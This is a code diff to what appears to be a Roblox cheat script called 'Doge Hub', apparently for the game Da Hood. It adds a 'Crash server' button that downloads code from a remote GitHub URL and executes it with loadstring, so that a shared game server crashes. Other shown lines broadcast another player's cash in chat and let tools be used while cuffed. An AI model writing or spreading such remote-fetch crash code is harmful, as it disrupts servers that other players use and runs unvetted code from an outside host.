@@ -199,6 +199,10 @@ Player = game:GetService'Players'.LocalPlayer;
 		end)
     end)
 
+	MainSection:NewButton("Crash server", "Crashes the server", function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/racemodex/my-scripts/master/dahoodcrash", true))()
+	end)
+
     local Player = Window:NewTab("Toggles")
     local TogglesSection = Player:NewSection("Toggles")
 
@@ -262,7 +266,7 @@ local Main = Window:NewTab("Extra")
 
 	ExtraSection:NewTextBox("Cash", "Tells you the amt of cash the player has", function(txt)
 		local TargetPlr = (txt)
-	local A_1 = "[Doge Hub] $" .. game.Players[TargetPlr].DataFolder.Currency.Value .. "" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
+	local A_1 = "[Doge Hub] $" .. game.Players[TargetPlr].DataFolder.Currency.Value .. " " local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
 	end)
 
 ExtraSection:NewButton("Tools while cuffed", "Allows you to use tools while cuffed", function(v)
